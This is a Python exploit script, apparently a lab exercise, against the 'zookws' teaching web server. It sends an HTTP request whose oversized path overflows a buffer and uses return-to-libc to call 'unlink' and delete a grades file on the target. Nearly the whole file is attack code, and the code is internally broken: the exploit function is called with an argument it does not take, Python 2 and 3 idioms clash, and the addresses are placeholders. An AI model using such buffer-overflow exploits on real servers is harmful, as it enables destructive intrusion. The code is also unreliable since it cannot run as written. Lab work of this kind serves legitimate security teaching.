#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

stack_buffer = 0x34567890
stack_saved_ebp = 0x12345678
stack_retaddr = stack_saved_ebp + 4

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.


import struct


def build_exploit():
    """
    Design an exploit based on the flaw from http.c (line 22).
    The goal is to employ a return-to-libc strategy to remove /home/httpd/grades.txt.
    """

    # Populate the buffer using the identified vulnerability
    crafted_path = "/" + "B" * 1024  # Using "B" instead of "A" just for a change

    # Memory location of 'unlink' in libc, determined using debugging tools
    unlink_function_address = 0xDD450

    # Redirecting the return to the unlink function
    crafted_path += struct.pack("<I", unlink_function_address)

    # Target file to be removed using the unlink function
    target_file = "/home/httpd/grades.txt"
    crafted_path += target_file

    http_request = f"GET {crafted_path} HTTP/1.0\r\n\r\n"
    return http_request


####


def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp


####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())
